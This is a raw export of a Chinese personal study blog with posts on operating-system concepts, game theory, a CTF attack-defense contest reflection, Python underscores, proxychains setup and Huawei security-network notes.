id="EDF-Earliest-Deadline-First-最早截止时间优先算法"><a href="#EDF-Earliest-Deadline-First-最早截止时间优先算法" class="headerlink" title="EDF (Earliest Deadline First) 最早截止时间优先算法"></a>EDF (Earliest Deadline First) 最早截止时间优先算法</h3><h3 id="LLF-Least-Laxity-First-最低松弛度算法"><a href="#LLF-Least-Laxity-First-最低松弛度算法" class="headerlink" title="LLF (Least Laxity First) 最低松弛度算法"></a>LLF (Least Laxity First) 最低松弛度算法</h3><p>松弛度 = (必须完成时间 - 本身运行时间 - 当前时间)</p><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>一组进程中每一个进程都在等待只有其他进程才能引发的时间</p><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><ul><li>互斥条件</li><li>请求和保持条件</li><li>不可抢占条件</li><li>循环等待条件</li></ul><h2 id="银行家算法-P121"><a href="#银行家算法-P121" class="headerlink" title="银行家算法 P121"></a>银行家算法 P121</h2><p>判断 需求是否小于等于需要的</p><p>判断 需要是否小于等于可用的</p><p>模拟分配并检测是否有安全序列</p><h2 id="磁盘缓存"><a href="#磁盘缓存" class="headerlink" title="磁盘缓存"></a>磁盘缓存</h2><p>在内存中暂存磁盘中读出的数据</p><h2 id="固定分区分配"><a href="#固定分区分配" class="headerlink" title="固定分区分配"></a>固定分区分配</h2><ul><li><p>相等 </p></li><li><p>不相等 建立表，记录分区信息</p></li></ul><h2 id="动态分区分配"><a href="#动态分区分配" class="headerlink" title="动态分区分配"></a>动态分区分配</h2><p>常见数据结构:</p><ul><li>空闲分区链</li><li>空闲分区表</li></ul><h2 id="空闲分区分配算法"><a href="#空闲分区分配算法" class="headerlink" title="空闲分区分配算法"></a>空闲分区分配算法</h2><h3 id="FF-First-Fit-首次适应"><a href="#FF-First-Fit-首次适应" class="headerlink" title="FF (First Fit) 首次适应"></a>FF (First Fit) 首次适应</h3><p>从头找，找到空间再划分内存给作业</p><h3 id="NF-Next-fit-循环首次适应"><a href="#NF-Next-fit-循环首次适应" class="headerlink" title="NF (Next fit) 循环首次适应"></a>NF (Next fit) 循环首次适应</h3><p>从上一次查找到的空闲区的下一个开始查找</p><h3 id="BF-Best-Fit-最佳适应算法"><a href="#BF-Best-Fit-最佳适应算法" class="headerlink" title="BF (Best Fit) 最佳适应算法"></a>BF (Best Fit) 最佳适应算法</h3><p>把能满足要求、最小的空闲区分配，但碎片很多</p><h3 id="WF-Worst-Fit-最坏适应算法"><a href="#WF-Worst-Fit-最坏适应算法" class="headerlink" title="WF (Worst Fit)最坏适应算法"></a>WF (Worst Fit)最坏适应算法</h3><p>总挑选最大的空闲区进行分配</p><p>优点 剩下的空闲区不至于太小 查找效率高</p><h2 id="分页储存"><a href="#分页储存" class="headerlink" title="分页储存"></a>分页储存</h2><h3 id="分页储存-1"><a href="#分页储存-1" class="headerlink" title="分页储存"></a>分页储存</h3><h4 id="页面和物理块"><a href="#页面和物理块" class="headerlink" title="页面和物理块"></a>页面和物理块</h4><p>用户程序的地址空间分为若干区域，成为页。</p><p>内存中同样划分，成为块</p><p>地址结构：</p><p>高20位 页号 低12位 位偏移量</p><h4 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h4><p>记录页在内存中对应的物理块号</p><h2 id="分段管理"><a href="#分段管理" class="headerlink" title="分段管理"></a>分段管理</h2><p>编程需要：</p><ul><li>信息共享</li><li>信息保护</li><li>动态增长</li><li>动态链接</li></ul><p>作业地址被分为多个段，所以呈现出二维特性</p><p>分段地址：</p><p>高16位 段号 低16位 段内地址</p><h3 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h3><p>各个段离散的放入内存不同分区中，需要为每个进程建立段映射表</p><p>实现从逻辑段到物理内存区的映射</p><h2 id="虚拟存储器定义"><a href="#虚拟存储器定义" class="headerlink" title="虚拟存储器定义"></a>虚拟存储器定义</h2><p>具有请求调入和置换功能，从逻辑上对内存扩充的存储器系统</p><h2 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h2><ul><li>多次性    分多次装入内存</li><li>对换性</li><li>虚拟性</li></ul><h2 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h2><h3 id="Optimal-最佳置换算法"><a href="#Optimal-最佳置换算法" class="headerlink" title="Optimal 最佳置换算法"></a>Optimal 最佳置换算法</h3><p>预测最久不使用的页并进行替换。</p><h3 id="FIFO-先进先出页面置换算法"><a href="#FIFO-先进先出页面置换算法" class="headerlink" title="FIFO 先进先出页面置换算法"></a>FIFO 先进先出页面置换算法</h3><p>总淘汰最先进入的（驻留最久的）</p><h3 id="LRU-Least-Recent-Used-最近最久未使用"><a href="#LRU-Least-Recent-Used-最近最久未使用" class="headerlink" title="LRU (Least Recent Used) 最近最久未使用"></a>LRU (Least Recent Used) 最近最久未使用</h3><p>选择最近最久未使用的页面</p><p>LRU和OPT，加物理块数不会增加缺页次数，FIFO不一定能减少缺页次数</p><h2 id="抖动"><a href="#抖动" class="headerlink" title="抖动"></a>抖动</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>运行的进程太多，频繁出新缺页，进程大部分时间都用于页面的换进换出</p><h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><ul><li>局部置换策略    只在分配给自己的内存中置换</li></ul><h2 id="请求分段储存管理"><a href="#请求分段储存管理" class="headerlink" title="请求分段储存管理"></a>请求分段储存管理</h2><h3 id="共享段表"><a href="#共享段表" class="headerlink" title="共享段表"></a>共享段表</h3><h3 id="分段保护"><a href="#分段保护" class="headerlink" title="分段保护"></a>分段保护</h3><ul><li>越界检查</li><li>存取控制检查</li><li>环保护机构 类似系统的内核等级</li></ul><h2 id="I-O基本功能"><a href="#I-O基本功能" class="headerlink" title="I/O基本功能"></a>I/O基本功能</h2><ul><li>方便用户使用</li><li>提高CPU和IO设备利用率</li><li>共享设备时提供方便</li></ul><h2 id="中断处理程序"><a href="#中断处理程序" class="headerlink" title="中断处理程序"></a>中断处理程序</h2><ul><li>测定是否有未响应的中断信号</li><li>保护被中断进程的CPU环境</li><li>转入相应的设备处理程序</li><li>中断处理</li><li>恢复CPU现场并退出中断</li></ul><p>图p206</p><h2 id="DMA控制器"><a href="#DMA控制器" class="headerlink" title="DMA控制器"></a>DMA控制器</h2><h3 id="主机-控制器接口"><a href="#主机-控制器接口" class="headerlink" title="主机-控制器接口"></a>主机-控制器接口</h3><ul><li>DR 数据寄存器</li><li>MAR 内存地址寄存器</li><li>DC 数据计数器</li><li>CR 命令/状态寄存器</li></ul><p>DC，MAR，CR获得从CPU传来的数据和命令，DR获取数据，并传入MAR</p><p>设置MAR和DC初值 -&gt; 启动DMA -&gt; 使用存储器周期传送数据 -&gt; 存储器地址+1，DC-1 -&gt; 循环</p><p>若DC = 0 请求中断</p><h2 id="与设备无关IO"><a href="#与设备无关IO" class="headerlink" title="与设备无关IO"></a>与设备无关IO</h2><ul><li>以物理设备名使用设备     不灵活，利用率也不高</li><li>逻辑设备名 </li></ul><h3 id="设备控制表DCT"><a href="#设备控制表DCT" class="headerlink" title="设备控制表DCT"></a>设备控制表DCT</h3><ul><li>设备类型</li><li>设备标志符</li><li>设备状态</li><li>指向控制器表的指针</li><li>重复执行次数或时间</li><li>设备队列的队首指针</li></ul><h3 id="控制器控制表COCT"><a href="#控制器控制表COCT" class="headerlink" title="控制器控制表COCT"></a>控制器控制表COCT</h3><p>记录控制器情况</p><h3 id="LUT-Logical-Unit-Table-逻辑设备表"><a href="#LUT-Logical-Unit-Table-逻辑设备表" class="headerlink" title="LUT (Logical Unit Table) 逻辑设备表"></a>LUT (Logical Unit Table) 逻辑设备表</h3><p>逻辑设备名 | 物理设备名 | 驱动程序入口地址</p><p>/dev/tty      |  3                |  1024</p><p>逻辑设备表 | 系统设备表指针</p><p>/dev/tty.     |    3</p><h2 id="缓冲"><a href="#缓冲" class="headerlink" title="缓冲"></a>缓冲</h2><p>CPU和IO设备速度不匹配</p><p>利用缓冲寄存器暂存数据</p><h2 id="磁盘调度算法"><a href="#磁盘调度算法" class="headerlink" title="磁盘调度算法"></a>磁盘调度算法</h2><h3 id="FCFS"><a href="#FCFS" class="headerlink" title="FCFS"></a>FCFS</h3><h3 id="SSTF-Shortest-Search-Time-First-最短寻道时间优先"><a href="#SSTF-Shortest-Search-Time-First-最短寻道时间优先" class="headerlink" title="SSTF (Shortest Search Time First) 最短寻道时间优先"></a>SSTF (Shortest Search Time First) 最短寻道时间优先</h3><h2 id="基于扫描的磁盘调度"><a href="#基于扫描的磁盘调度" class="headerlink" title="基于扫描的磁盘调度"></a>基于扫描的磁盘调度</h2><h3 id="SCAN-扫描算法-又称电梯调度算法"><a href="#SCAN-扫描算法-又称电梯调度算法" class="headerlink" title="SCAN 扫描算法 又称电梯调度算法"></a>SCAN 扫描算法 又称电梯调度算法</h3><p>要访问的磁道与刺头当前距离较近</p><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>文件逻辑结构</p><p>文件由一系列逻辑记录组成，是可以直接处理的数据及其结构，独立于文件的物理特性，又称文件组织</p><p>物理结构</p><p>对磁盘管理器的要求</p><ul><li>有效地利用存储空间</li><li>提高磁盘IO速率</li><li>提高磁盘系统可靠性</li></ul><p>外存组织方式</p><ul><li>连续</li><li>链接</li><li>索引</li></ul><h2 id="链接组织方式"><a href="#链接组织方式" class="headerlink" title="链接组织方式"></a>链接组织方式</h2><p>显式 表中放指针，链表、隐式 链表</p><h2 id="FAT"><a href="#FAT" class="headerlink" title="FAT"></a>FAT</h2><p>分成卷</p><p>一个磁盘可多个卷，一个卷可由多个磁盘组成</p><p>文件第一个盘号放在FCB中，FAT每个表项最后放下一个盘块号</p><h3 id="簇"><a href="#簇" class="headerlink" title="簇"></a>簇</h3><p>是一组相邻的上去，作为虚拟扇区。盘块分配时以簇为基本单位</p><p>好处：能适应磁盘容量不断增大的情况，还可减少FAT表中项数</p><h2 id="文件储存空间管理"><a href="#文件储存空间管理" class="headerlink" title="文件储存空间管理"></a>文件储存空间管理</h2><h3 id="空闲表法"><a href="#空闲表法" class="headerlink" title="空闲表法"></a>空闲表法</h3><p>给每个文件分配连续存储空间。</p><p>系统也会为外存空闲区建立空闲表</p><h3 id="位视图法"><a href="#位视图法" class="headerlink" title="位视图法"></a>位视图法</h3><p>二位数组模样，m*n=磁盘总块数</p>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博弈论</title>
    <link href="/2020/01/13/%E5%8D%9A%E5%BC%88%E8%AE%BA/"/>
    <url>/2020/01/13/%E5%8D%9A%E5%BC%88%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/av41333177?p=2">LINK</a><br>《博弈圣经》博弈论的定义：我们把动物利用大自然移动的瘾魂，在决策人期待的空间里，形成三维均衡的学术理论，称为博弈论。<br>基本概念中包括局中人、行动、信息、策略、收益、均衡和结果等。其中局中人、策略和收益是最基本要素。局中人、行动和结果被统称为博弈规则。</p><h2 id="Class1"><a href="#Class1" class="headerlink" title="Class1"></a>Class1</h2><p><em>定义：如果一个选项得到的结果严格优于另一个选项，那么称这个选项为严格优势策略。</em></p><p><strong>结论1：不要选择严格劣势策略</strong></p><p><strong>结论2：理性的选择，使得总结果变得更坏</strong></p><p>改变收益，就会改变目的。</p><p><strong>结论3：予欲得之，必先知之</strong></p><p>结论4：分析他们（对手）的收益，站在别人的立场上去分析他们会怎么做</p><blockquote><p>2019/8/6</p></blockquote><hr><h2 id="Class2"><a href="#Class2" class="headerlink" title="Class2"></a>Class2</h2><p>博弈的要素：参与人（i,j）、策略（si,Si策略集合，s某一次博弈）、收益（U，Ui(s)）</p><p>s-i:除了i以外其他参与人每人的策略</p><table><thead><tr><th align="left">1/2</th><th align="left">L</th><th align="left">C</th><th align="left">R</th></tr></thead><tbody><tr><td align="left">T</td><td align="left">5,-1</td><td align="left">11,3</td><td align="left">0,0</td></tr><tr><td align="left">B</td><td align="left">6,4</td><td align="left">0,2</td><td align="left">2,0</td></tr></tbody></table><p>S1={T,B} S2={L,C,R}</p><p>U1(T,C)=11 U2(T，C)=3</p><p>定义：参与人i的策略s’i严格劣于另一个策略si，在其他人选择s-i时，选择si的收益UI严格优于此情况下选择s’i的收益UI</p><table><thead><tr><th align="left">De/Attach</th><th align="left">ez</th><th align="left">hard</th></tr></thead><tbody><tr><td align="left">E</td><td align="left">1,1</td><td align="left">1,1</td></tr><tr><td align="left">H</td><td align="left">0,2</td><td align="left">2,0</td></tr></tbody></table><p><strong><em>定义：参与者i的策略s’i，弱劣于策略si当且仅当在对手选择s-i的情况下，参与人i选择si的收益等于对手选s-i下他选s’i的收益，而且在任何情况下均成立。除此之外，对手选s-i参与者的i的策略si，严格优于其他策略s’i，至少在某种情况下成立\</em></strong>（参与者i的策略s’i弱劣于策略si，当且仅当无论对手怎么做，他选择si的收益至少与选择s‘i的相等，有些情况甚至是严格占优的）</p><p>共同知识：我知道一个事情，你也知道这件事，我知道你知道，你知道我知道……</p><p>相互知识不是共同知识，共同知识定义很严格。</p><blockquote><p>2019/8/7</p></blockquote><hr><h2 id="Class-3"><a href="#Class-3" class="headerlink" title="Class 3"></a>Class 3</h2><p>迭代剔除劣势策略：揣测对手意图，揣测对手知道我们的意图</p><p>商业会集中获得附近客源</p><p>==第三竞选者如何影响选举结果?==</p><p>最佳对策：最大化预期收益</p><p><a href="https://i.loli.net/2019/08/10/g9hIt6PSRsxrcul.png"><img src="%E5%8D%9A%E5%BC%88%E8%AE%BA/g9hIt6PSRsxrcul.png" alt="Class 3 画图"></a></p><p>画图用数据解释比较好</p><blockquote><p>2019/8/8</p></blockquote><hr><h2 id="Class4"><a href="#Class4" class="headerlink" title="Class4"></a>Class4</h2><table><thead><tr><th align="left">F/D</th><th align="left">L</th><th align="left">R</th></tr></thead><tbody><tr><td align="left">L</td><td align="left">4.-4</td><td align="left">9,-9</td></tr><tr><td align="left">M</td><td align="left">6,-6</td><td align="left">6,-6</td></tr><tr><td align="left">R</td><td align="left">9,-9</td><td align="left">4,-4</td></tr></tbody></table><p><a href="https://i.loli.net/2019/08/10/3XoNK7aLYSU5VTM.png"><img src="%E5%8D%9A%E5%BC%88%E8%AE%BA/3XoNK7aLYSU5VTM.png" alt="Class4 另一种画图方法"></a></p><p>不要选择一个任何选择下都非最佳对策的策略。</p><p><strong><em>最佳对策：参与人i的策略Si，是一个最佳对策（BR），是对手的策略S-i的最佳对策。如果参与人i在对手的s-i策略下，选Si的收益弱优于对手的其他策略Si’\</em></strong></p><p><strong><em>最佳对策：Si满足所有情况中，最大化了对手选S-i时我的收益\</em></strong></p><p>合伙人：两个实体共同完成一个协作项目，并且平分利润</p><p>外部性：我的努力不仅对我有利，对你也有利</p><p>纳什均衡：没人想选择其他策略，在这个点，互相都采用的是最佳策略</p><blockquote><p>2019/8/9</p></blockquote><p><strong><em>未完待续\</em></strong></p>]]></content>
    
    
    <categories>
      
      <category>课外学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安洵杯线下AWD总结</title>
    <link href="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/"/>
    <url>/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/image-20191210210716136.png" class="" title="image-20191210210716136"><img src="/2020/01/13/%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8BAWD%E6%80%BB%E7%BB%93/95038C770B129D8AE642F53530CAB33B.jpg" class="" title="img"><h2 id="事后BB"><a href="#事后BB" class="headerlink" title="事后BB"></a>事后BB</h2><p>==赛前自动提交flag脚本没有，自动化打全场脚本没有，哎。==</p><p>线下还是很友好的，可以连接外网，伙食也很不错，但是！</p><p><strong>只有先黑盒测试过了自己的，拿了flag并提交了之后，才可以找主办方要ssh密码=。=并且AWD只有1道pwn题，3个web题，域渗透部分就更不必多说了，都是web，哎</strong></p><h2 id="AWD规则"><a href="#AWD规则" class="headerlink" title="AWD规则"></a>AWD规则</h2><p>连接的是docker服务器，所以给的都是端口</p><p>端口列表：axx80/axx22 </p><ul><li>eg: team01-web1 10180(web) 10122(ssh) </li><li>eg: team18-web2 11880(web) 11822(ssh) </li><li>eg: team19-web3 30180(web) 30122(ssh) </li><li>eg: team01-pwn1 40180(pwn) 40122(ssh)</li></ul><p>==比如我拿到的pwn端口是40980，那么别人的就是4xx80，40080端口到41780端口，写打全场脚本就这样挨个端口打过去==</p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>开局好久都是蒙蔽状态，不知道ip，不知道端口，<strong>但其实这些都在群里发的线下赛说明中包含有，需要注意去看QAQ</strong></p><p>有空了我就找找看看写写自动化提交和多进程打全场脚本QAQ</p><p>pwn的话，就专心做，打通了，自己的这边的话就修改一下栈的位置？挪一下栈什么的，打个patch就好了= =（当然我还没试过，慢慢学习.jpg）</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p><a href="https://xz.aliyun.com/t/3607">AWD二进制运维工具</a></p><p><a href="https://www.cnblogs.com/work115/p/5621789.html">python之多进程</a>-因为听南梦说多线程容易崩</p><p><a href="https://www.cnblogs.com/xiao-apple36/p/9144092.html">Python模块学习 - Paramiko</a></p><p>幸好新苗没中，可以专心搞pwn了哎</p><p>向南梦大佬学习，<a href="https://196011564.github.io/">link</a></p>]]></content>
    
    
    <categories>
      
      <category>反思总结</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python中下划线的5种含义</title>
    <link href="/2020/01/13/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/"/>
    <url>/2020/01/13/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<p>在用python重写算法，学习学习算法时，一时好奇（打基础）来学习了python的下划线</p><ul><li><p>单前导下划线：_var            小小警示，提示只在内部使用，非public和private那种</p></li><li><p>单末尾下划线：var_            解决命名冲突的问题</p></li><li><p>双前导下划线：__var          防止变量在子类中被重写，只能在类内访问</p></li><li><p>单下划线：_                        使用“_”来表示它只是一个临时值</p></li><li><p>双前导和末尾下划线：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__var__</span><br></code></pre></td></tr></table></figure><p>这个感觉有点奇怪，一个是常见的类内init，另一个则是下面这种len的写法</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Linkedlist</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.head = Node()<br>        self.length = <span class="hljs-number">0</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__len__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> self.length<br></code></pre></td></tr></table></figure><p>当我在main里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    L = Linkedlist()<br>    L.append(<span class="hljs-number">3</span>)<br>    L.append(<span class="hljs-number">5</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;链表长度&quot;</span>,<span class="hljs-built_in">len</span>(L))<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>这样也可以输出len来= =</p></li></ul><p>  学习的网站：</p><ul><li><a href="https://blog.csdn.net/tcx1992/article/details/80105645">https://blog.csdn.net/tcx1992/article/details/80105645</a></li><li><a href="https://blog.csdn.net/zhangvalue/article/details/93606688">https://blog.csdn.net/zhangvalue/article/details/93606688</a></li></ul><p>  感觉跟着一步步测试下来更会用，但想完全知道怎么来的估计得去翻文档www</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
      <category>学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Proxychains</title>
    <link href="/2020/01/13/Proxychains/"/>
    <url>/2020/01/13/Proxychains/</url>
    
    <content type="html"><![CDATA[<p>折腾两小时，不如问一下人= =</p><p>Proxychains</p><p>先安装</p><p>然后sudo vi /etc/proxychains.conf</p><p>socks5 win_ip 1080</p><p>win_ip为你的windows主机ip，可在cmd ifconfig查看</p><p>飞机要打开允许局域网连接</p><img src="/2020/01/13/Proxychains/image-20200110135926592.png" class="" title="image-20200110135926592"><p>然后运行测试</p><p>proxychains4 telnet <a href="http://www.google.com">www.google.com</a> 443</p><p>可以之后就可以直接sudo proxychains4 apt-get update了</p>]]></content>
    
    
    <categories>
      
      <category>Linux使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux 问题解决</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HCNP-SEC-19.11.23</title>
    <link href="/2020/01/13/HCNP-SEC-19.11.23/"/>
    <url>/2020/01/13/HCNP-SEC-19.11.23/</url>
    
    <content type="html"><![CDATA[<img src="/2020/01/13/HCNP-SEC-19.11.23/648EB2E3-ECFB-4610-AC4F-C41A40C726F0.png" class="" title="648EB2E3-ECFB-4610-AC4F-C41A40C726F0"><blockquote><p>eSight网管 可管其他厂商设备，几乎都可以</p><p>CIS可用于抵御APT攻击。它从海量数据中提取关键信息，智能可视化，还原攻击链，防御攻击</p><p>FireHunter还原流量，在虚拟环境对网络中传输的文件进行检测</p><p>UMA 审计上网行为</p><p>NGFW USG9000 网络运营商，广电（超大型网络）USG6000 中大型企业</p><p>业务随行</p><p>S12700 整个网络核心 S9k S7k</p><img src="/2020/01/13/HCNP-SEC-19.11.23/61051AC5-C8D2-47E8-9516-09E3979F7769.png" class="" title="61051AC5-C8D2-47E8-9516-09E3979F7769"></blockquote><h2 id="网络安全运维"><a href="#网络安全运维" class="headerlink" title="网络安全运维"></a>网络安全运维</h2><p>安全策略：简单，稳定，安全</p><p>端口要加端口描述</p><p>脚本配置</p><img src="/2020/01/13/HCNP-SEC-19.11.23/52CCD98F-87B0-4D17-9CD9-043B92E84B1E.png" class="" title="52CCD98F-87B0-4D17-9CD9-043B92E84B1E"><img src="/2020/01/13/HCNP-SEC-19.11.23/6D82AE28-99ED-4EE5-8BAF-F34E0639D652.png" class="" title="6D82AE28-99ED-4EE5-8BAF-F34E0639D652"><img src="/2020/01/13/HCNP-SEC-19.11.23/9C6D9139-095E-43E4-A914-232B379D1387.png" class="" title="9C6D9139-095E-43E4-A914-232B379D1387"><img src="/2020/01/13/HCNP-SEC-19.11.23/0C995BDD-0A38-483B-B32B-727CA8AAF2C4.png" class="" title="0C995BDD-0A38-483B-B32B-727CA8AAF2C4"><blockquote><p>监控（类似只读）</p></blockquote><img src="/2020/01/13/HCNP-SEC-19.11.23/4731E999-DBE2-4436-B428-3BC61E399D80.png" class="" title="4731E999-DBE2-4436-B428-3BC61E399D80"><img src="/2020/01/13/HCNP-SEC-19.11.23/B33BEC42-D775-4EDF-98B9-08454E630607.png" class="" title="B33BEC42-D775-4EDF-98B9-08454E630607"><img src="/2020/01/13/HCNP-SEC-19.11.23/3B696243-B418-4CCF-AE64-B94BC4556C4D.png" class="" title="3B696243-B418-4CCF-AE64-B94BC4556C4D"><img src="/2020/01/13/HCNP-SEC-19.11.23/3CAA5AFE-7E9C-48D1-BC36-7D357E6FCEF3.png" class="" title="3CAA5AFE-7E9C-48D1-BC36-7D357E6FCEF3"><img src="/2020/01/13/HCNP-SEC-19.11.23/7BC6559D-1E13-4026-AC0A-B341738B51A7.png" class="" title="7BC6559D-1E13-4026-AC0A-B341738B51A7"><img src="/2020/01/13/HCNP-SEC-19.11.23/C7585DFE-372F-4841-B579-E5ABF8B743C4.png" class="" title="C7585DFE-372F-4841-B579-E5ABF8B743C4"><img src="/2020/01/13/HCNP-SEC-19.11.23/A037C828-5CD5-4549-A6A4-E7E7CBE5A54C.png" class="" title="A037C828-5CD5-4549-A6A4-E7E7CBE5A54C"><img src="/2020/01/13/HCNP-SEC-19.11.23/62BE7CDD-3135-430E-987F-6EACF0D80B0A.png" class="" title="62BE7CDD-3135-430E-987F-6EACF0D80B0A"><img src="/2020/01/13/HCNP-SEC-19.11.23/FE1DD198-9061-4788-819D-4EB92584BB87.png" class="" title="FE1DD198-9061-4788-819D-4EB92584BB87"><img src="/2020/01/13/HCNP-SEC-19.11.23/9DCB02F8-A1E8-49FB-B30B-8D1D93C28D5E.png" class="" title="9DCB02F8-A1E8-49FB-B30B-8D1D93C28D5E"><img src="/2020/01/13/HCNP-SEC-19.11.23/C3771611-034E-4CE2-B951-D908189A4396.png" class="" title="C3771611-034E-4CE2-B951-D908189A4396"><img src="/2020/01/13/HCNP-SEC-19.11.23/C8E502F2-BA95-4D88-980E-B339A71104CC.png" class="" title="C8E502F2-BA95-4D88-980E-B339A71104CC"><p>QS 优先级？优先保证业务</p><p>FW作为出口且有多条出口链路，两条链路一接，最起码也要做一个链路聚合（Eth-Trunck）</p><p>在ensp中，fw连接router，在实际中不会占用GE0/0/0（这是个管理口）</p><h2 id="智能选路应用场景"><a href="#智能选路应用场景" class="headerlink" title="智能选路应用场景"></a>智能选路应用场景</h2><p>网络差，如何优化：增加带宽，增加IP，调整点位</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130211703575.png" class="" title="image-20191130211703575"><ul><li>全局选路策略：动态选择出接口，充分利用资源</li><li>策略路由：依据制定的策略进行数据转发</li><li><strong>ISP路由</strong>：可以实现流量按照运营商转发，指定选路</li><li>健康检查，感知服务器或链路状态变化，保证流量传输</li></ul><blockquote><p>园区网的四大敏捷特性：有线无线深度融合，业务随行，安全协防，IPCA质量感知（极少）</p></blockquote><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130213239431.png" class="" title="image-20191130213239431"><blockquote><p>路由策略和策略路由的区别？？</p></blockquote><h2 id="选路原理"><a href="#选路原理" class="headerlink" title="选路原理"></a>选路原理</h2><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130213351116.png" class="" title="image-20191130213351116"><h3 id="过载保护：有预值"><a href="#过载保护：有预值" class="headerlink" title="过载保护：有预值"></a>过载保护：有预值</h3><ul><li>根据带宽：默认的。<strong>原流量仍从该链路走，后续不再。并且全部过载，则继续根据比例分配流量</strong><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130220056847.png" class="" title="image-20191130220056847"></li><li><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130220558188.png" class="" title="image-20191130220558188"></li></ul><blockquote><p>入方向？出方向？</p></blockquote><ul><li>根据链路质量：<strong>保证质量，保证体验</strong><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130221210672.png" class="" title="image-20191130221210672"></li><li><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130221323811.png" class="" title="image-20191130221323811"></li><li>根据链路权重：根据预设的权重</li><li>根据链路优先级：默认优先级高的，超过过载阈值时启用优先级次高的链路。（少用，不可能闲置）</li></ul><h3 id="过载保护的问题"><a href="#过载保护的问题" class="headerlink" title="过载保护的问题"></a>过载保护的问题</h3><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130221945199.png" class="" title="image-20191130221945199"><p>会话保持：<img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130222127477.png" class="" title="image-20191130222127477"></p><p>查看会话保持表项（要有流量经过才能查看到</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">display</span> session persistence <span class="hljs-selector-tag">table</span><br></code></pre></td></tr></table></figure><h2 id="策略路由"><a href="#策略路由" class="headerlink" title="策略路由"></a>策略路由</h2><p>依据用户制定的策略进行转发</p><p>bypass 直通模式，FW相当于透明</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130222809732.png" class="" title="image-20191130222809732"><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130222832266.png" class="" title="image-20191130222832266"><blockquote><p>先看策略，无策略则按路由表转发</p></blockquote><h2 id="ISP选路"><a href="#ISP选路" class="headerlink" title="ISP选路"></a>ISP选路</h2><p>在FW连接多个ISP网络时，通过ISP选路可以使访问特定ISP的流量通过相应出接口转发，保证最短路径。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>写入CSV文件（该文件成为ISP地址文件），然后导入FW</p><img src="/2020/01/13/HCNP-SEC-19.11.23/image-20191130223451969.png" class="" 